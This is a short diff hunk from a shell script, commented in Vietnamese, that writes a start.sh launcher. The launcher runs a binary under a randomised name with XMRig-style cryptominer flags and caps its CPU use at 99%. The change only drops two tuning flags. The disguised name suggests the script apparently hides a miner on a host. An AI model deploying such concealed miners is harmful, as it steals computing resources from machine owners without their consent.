@@ -71,7 +71,7 @@ cat <<EOF > start.sh
 export PATH=".:\$PATH"  # Thêm thư mục hiện tại vào PATH
 
 # Khởi chạy $RAND_NAME và giới hạn CPU
-$RAND_NAME --donate-level 1 --cpu-priority 2 --randomx-1gb-pages &
+$RAND_NAME --donate-level 1 &
 exec_pid=\$!
 cpulimit -p \$exec_pid -l 99 &
 
